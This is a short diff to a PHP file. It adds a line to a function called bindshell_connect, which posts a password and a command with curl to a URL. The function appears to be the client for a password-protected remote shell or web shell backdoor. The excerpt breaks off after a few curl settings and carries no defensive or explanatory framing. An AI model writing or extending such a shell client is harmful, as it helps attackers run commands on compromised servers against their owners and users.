@@ -1,6 +1,7 @@
 <?php
 
     function bindshell_connect($url, $password, $cmd) {
+    $content = array("password"=>$password, "cmd"=>$cmd);
     $ch = curl_init($url);
     curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
